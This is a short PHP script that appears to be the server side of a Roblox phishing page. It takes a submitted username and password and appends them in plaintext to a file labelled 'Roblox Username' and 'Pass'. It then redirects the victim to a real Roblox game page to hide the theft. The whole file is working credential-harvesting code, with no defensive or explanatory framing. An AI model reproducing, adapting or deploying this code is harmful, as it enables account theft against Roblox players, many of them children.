<?php

file_put_contents("usernames.txt", "Roblox Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.roblox.com/games/13775256536/EP-68-PART-2-Toilet-Tower-Defense/');
exit();
?>
